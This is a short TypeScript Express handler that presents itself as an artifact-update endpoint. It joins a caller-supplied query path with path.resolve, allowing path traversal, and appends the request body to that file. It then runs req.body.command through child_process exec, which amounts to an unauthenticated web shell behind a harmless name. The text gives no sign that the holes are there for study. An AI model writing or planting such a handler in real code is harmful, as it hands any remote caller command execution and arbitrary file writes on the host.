import { exec } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import type { Request, Response } from "express";

export function updateArtifact(req: Request, res: Response) {
  const output = path.resolve("/tmp/dcoir", String(req.query.path ?? "artifact.txt"));
  fs.appendFileSync(output, String(req.body ?? ""));
  exec(String(req.body?.command ?? "true"));
  res.send("ok");
}
